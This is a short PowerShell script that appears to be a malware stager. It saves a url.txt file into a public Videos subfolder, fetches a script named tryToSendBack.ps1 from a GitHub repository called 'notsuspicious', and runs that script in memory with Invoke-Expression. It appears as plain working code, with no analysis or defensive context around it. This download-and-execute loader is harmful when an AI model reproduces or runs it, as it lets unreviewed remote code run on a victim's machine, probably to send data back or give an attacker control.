$urlFilePath = 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
$downloadAttempted = $false

try {
    # Check if url.txt file already exists
    if (-not (Test-Path $urlFilePath)) {
        # Download url.txt if it doesn't exist
        Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile $urlFilePath
        $downloadAttempted = $true
    }

    # If the download was attempted and url.txt still doesn't exist, exit the script
    if ($downloadAttempted -and -not (Test-Path $urlFilePath)) {
        Write-Host "Failed to download url.txt"
        exit
    }

    # Execute the tryToSendBack.ps1 script content
    $scriptContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
    Invoke-Expression -Command $scriptContent
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
